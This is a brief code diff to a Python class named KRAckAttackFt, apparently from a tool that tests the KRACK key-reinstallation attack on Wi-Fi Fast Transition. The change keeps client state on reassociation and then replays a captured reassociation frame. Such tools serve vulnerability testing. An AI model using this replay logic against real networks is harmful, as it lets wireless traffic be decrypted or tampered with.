@@ -58,7 +58,7 @@ class KRAckAttackFt():
 			self.reset_client()
 			log(INFO, "Detected Authentication frame, clearing client state")
 		elif p.addr2 == self.clientmac and Dot11ReassoReq in p:
-			self.reset_client()
+			# self.reset_client()
 			if get_element(p, IEEE_TLV_TYPE_RSN) and get_element(p, IEEE_TLV_TYPE_FT):
 				log(INFO, "Detected FT reassociation frame")
 				self.start_replay(p)
